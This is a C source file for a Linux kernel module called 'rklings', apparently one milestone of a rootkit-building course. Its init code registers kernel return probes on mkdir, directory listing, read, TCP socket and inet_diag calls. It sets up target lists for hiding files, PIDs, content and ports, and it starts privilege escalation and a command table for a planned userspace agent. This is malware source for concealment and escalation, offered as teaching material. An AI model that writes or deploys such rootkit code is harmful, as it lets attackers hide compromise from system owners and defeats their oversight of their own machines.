// SPDX-License-Identifier: GPL-2.0
#include "rootkit.h"
#include <linux/init.h>
#include <linux/kmod.h>
#include <linux/module.h>
#include <linux/printk.h>

extern struct kretprobe rk_mkdir_probe;
extern struct kretprobe rk_mkdirat_probe;
extern struct kretprobe rk_getdents_probe;
extern struct kretprobe rk_read_probe;
extern struct kretprobe rk_tcp4_probe;
extern struct kretprobe rk_tcp6_probe;
extern struct kretprobe rk_inet_diag_probe;

static struct kretprobe *probes[] = {
	&rk_mkdir_probe,
	&rk_mkdirat_probe,
	&rk_getdents_probe,
	&rk_read_probe,
	&rk_tcp4_probe,
	&rk_tcp6_probe,
	&rk_inet_diag_probe,
};

static int nr_probes;

static int cmd_ping(const char *arg)
{
	pr_info("rklings: pong\n");
	return 0;
}

static int cmd_status(const char *arg)
{
	pr_info("rklings: alive\n");
	return 0;
}

/* Agent lifecycle stubs: list and quit are registered now so the command table
 * is complete, but they become meaningful in L15 when the userspace agent
 * connects.  The agent owns presentation/listing and connection teardown. */
static int cmd_agent_control(const char *arg)
{
	return 0;
}

static const struct rk_cmd_entry init_cmds[] = {
	{ "ping",   cmd_ping },
	{ "status", cmd_status },
	{ "list",   cmd_agent_control },
	{ "quit",   cmd_agent_control },
};

static int __init rk_init(void)
{
	int ret, i;

	rk_target_init(&rk_file_targets);
	rk_target_init(&rk_pid_targets);
	rk_target_init(&rk_content_targets);
	rk_target_init(&rk_port_targets);

	ret = rk_cmds_register(init_cmds, ARRAY_SIZE(init_cmds));
	if (ret)
		return ret;

	ret = rk_escalate_init();
	if (ret)
		return ret;

	ret = rk_module_cmds_init();
	if (ret)
		return ret;

	ret = rk_filter_init();
	if (ret)
		return ret;
	ret = request_module("inet_diag");
	if (ret && ret != -EEXIST)
		return ret;

	for (i = 0; i < ARRAY_SIZE(probes); i++) {
		ret = register_kretprobe(probes[i]);
		if (ret)
			goto fail_probes;
		nr_probes++;
	}

	pr_info("rklings: loaded\n");
	return 0;

fail_probes:
	while (nr_probes--)
		unregister_kretprobe(probes[nr_probes]);
	return ret;
}

static void __exit rk_exit(void)
{
	int i;

	rk_module_unhide();
	for (i = nr_probes - 1; i >= 0; i--)
		unregister_kretprobe(probes[i]);
	pr_info("rklings: unloaded\n");
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings local control milestone");
